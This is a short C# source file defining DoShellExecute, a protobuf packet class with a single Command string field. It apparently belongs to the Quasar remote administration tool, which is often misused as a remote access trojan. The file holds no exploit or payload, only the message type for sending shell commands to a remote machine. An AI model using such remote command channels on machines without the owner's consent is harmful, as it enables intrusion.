using ProtoBuf;

namespace Quasar.Common.Packets
{
    [ProtoContract]
    public class DoShellExecute : IPacket
    {
        [ProtoMember(1)]
        public string Command { get; set; }
    }
}
